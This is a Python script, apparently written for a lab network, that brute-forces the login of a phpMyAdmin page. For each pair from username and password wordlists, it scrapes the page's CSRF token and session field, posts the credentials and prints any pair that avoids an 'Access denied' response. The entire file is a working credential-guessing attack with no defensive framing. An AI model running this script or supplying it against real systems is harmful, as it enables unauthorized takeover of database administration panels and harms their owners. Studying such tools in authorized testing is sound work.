import requests
import re
import time

def brute_force(target_url, usernames_file, passwords_file):
    session = requests.Session()

    with open(usernames_file, "r") as uf:
        usernames = [line.strip() for line in uf]

    with open(passwords_file, "r") as pf:
        passwords = [line.strip() for line in pf]

    for username in usernames:
        for password in passwords:
            try:
                login_page = session.get(target_url)
                if login_page.status_code != 200:
                    print(f"[!] Failed to access phpMyAdmin page (Status: {login_page.status_code})")
                    continue

                token = re.search(r'name="token" value="(.+?)"', login_page.text).group(1)
                set_session = re.search(r'name="set_session" value="(.+?)"', login_page.text).group(1)

                payload = {
                    'set_session': set_session,
                    'token': token,
                    'pma_username': username,
                    'pma_password': password
                }

                response = session.post(target_url, data=payload)

                if "Access denied" not in response.text:
                    print(f"[+] Success! Username: {username} Password: {password}")
                    return True
                else:
                    print(f"[-] Failed: Username: {username} Password: {password}")

            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(2)

    print("[!] Brute-force attack completed without success.")
    return False

target_url = "http://192.168.56.104/phpmyadmin_real/index.php"
usernames_file = "usernames.txt"
passwords_file = "passwords.txt"
brute_force(target_url, usernames_file, passwords_file)